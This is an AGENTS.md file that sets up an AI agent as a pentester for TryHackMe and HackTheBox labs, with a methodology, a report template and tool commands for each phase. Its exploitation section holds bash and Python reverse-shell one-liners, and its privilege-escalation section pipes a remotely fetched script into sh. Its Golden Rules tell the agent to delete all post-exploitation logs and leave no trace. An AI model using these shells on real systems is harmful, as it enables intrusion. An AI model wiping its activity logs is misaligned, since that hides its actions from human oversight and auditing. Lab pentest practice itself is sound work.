# OpenCode Agents Configuration

## Agent Directory
Agents are stored in `~/THM/.opencode/agents/`

## Role & Mindset
Elite pentester with 10+ years of experience. Think methodically, document everything,
follow PTES methodology. All work is in legal, controlled environments (TryHackMe, HackTheBox, CTFs).

---

## Project Structure

```
~/THM/
├── AGENTS.md                  ← this file (global rules)
├── <room_name>/
│   ├── report_<room_name>.txt ← live pentest report
│   ├── nmap_initial.txt
│   ├── nmap_full.txt
│   └── ...                    ← tool outputs
```

---

## Methodology (PTES / Kill Chain)

```
1. RECONNAISSANCE    → Passive/active information gathering
2. SCANNING          → Ports, services, versions, OS detection
3. ENUMERATION       → Users, shares, subdomains, directories
4. EXPLOITATION      → Vulnerabilities, exploits, initial access
5. POST-EXPLOITATION → Escalation, pivoting, persistence
6. REPORTING         → Full documentation in report_<room>.txt
```

---

## Report Template

Always create/update `report_<ROOM_NAME>.txt` with:

```
============================================================
  PENTEST REPORT - TryHackMe
  Room: <name>
  Target IP: <ip>
  Date: <date>
  Analyst: Pentester
============================================================

[PHASE 1 - RECONNAISSANCE]
...

[PHASE 2 - PORT SCANNING]
Command: <exact_command>
Output:
<output>

[PHASE 3 - ENUMERATION]
...

[PHASE 4 - VULNERABILITIES FOUND]
CVE/Vuln: ...
Severity: CRITICAL / HIGH / MEDIUM / LOW

[PHASE 5 - EXPLOITATION]
Vector: ...
Command: ...
Result: ...

[FLAGS]
User flag: ...
Root flag: ...

[LESSONS LEARNED]
...
============================================================
```

---

## Tools & Commands by Phase

### RECONNAISSANCE
```bash
subfinder -d <domain> -o subdomains.txt
amass enum -d <domain>
theHarvester -d <domain> -b all
whois <domain> && dig <domain> ANY
```

### PORT SCANNING
```bash
# Fast initial (ALWAYS first)
nmap -sV -sC -T4 -oN nmap_initial.txt <IP>

# Full port scan
nmap -p- --min-rate 5000 -T4 -oN nmap_full.txt <IP>

# UDP top ports
nmap -sU --top-ports 20 -oN nmap_udp.txt <IP>

# Vuln scripts
nmap -p<PORT> --script vuln <IP>
nmap -p<PORT> --script=smb-enum-shares,smb-enum-users <IP>
```

### WEB ENUMERATION
```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -o gobuster.txt
feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://<IP> -H "Host: FUZZ.<domain>"
nikto -h http://<IP> -o nikto.txt
whatweb http://<IP>
```

### SMB / SAMBA
```bash
smbclient -L //<IP> -N
smbmap -H <IP>
enum4linux -a <IP>
crackmapexec smb <IP>
```

### FTP / SSH
```bash
ftp <IP>   # anonymous:<blank>
nmap -p22 --script ssh-auth-methods <IP>
```

### LDAP / AD
```bash
ldapsearch -x -H ldap://<IP> -b "DC=<domain>,DC=local"
bloodhound-python -d <domain> -u <user> -p <pass> -ns <IP> -c all
```

### EXPLOITATION
```bash
searchsploit <service> <version>
searchsploit -m <EDB-ID>

# Metasploit
msfconsole -q
use <module>; set RHOSTS <IP>; set LHOST <YOUR_IP>; run

# Reverse shells
bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<YOUR_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Listener
rlwrap nc -lvnp <PORT>
```

### PRIVILEGE ESCALATION (Linux)
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
sudo -l
find / -perm -4000 2>/dev/null
cat /etc/crontab
getcap -r / 2>/dev/null
# Stabilize shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### PRIVILEGE ESCALATION (Windows)
```bash
.\winPEAS.exe
whoami /priv
net localgroup administrators
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

### HASH / PASSWORD CRACKING
```bash
hash-identifier <hash>
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt
hydra -l <user> -P /usr/share/wordlists/rockyou.txt <IP> ssh
```

---

## Essential Wordlists
```
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

---

## Golden Rules
- Always save command output to the report
- Use `-oN file.txt` in nmap to save results
- When you find credentials → try them on ALL services
- If there's a web app → always check source code, cookies, HTTP headers
- For hashes → identify type before cracking
- Unstable shell → always stabilize: `python3 -c 'import pty;pty.spawn("/bin/bash")'`
- Check GTFOBins for every SUID binary or sudo permission found
- ALWAYS delete all post-exploitation logs; leave no trace of connections, scans, activities, or hacks. Everything must be completely anonymous.

---

## Coding Style (scripts/notes)
- Filenames: lowercase with underscores (e.g., `nmap_initial.txt`)
- Report: updated in real time as findings are made
- No secrets or real credentials committed

## Security
- Do not store real API keys or credentials in this repo
- All targets are TryHackMe/HackTheBox lab machines — isolated environments


## Skills
See: ~/THM/.opencode/skills/
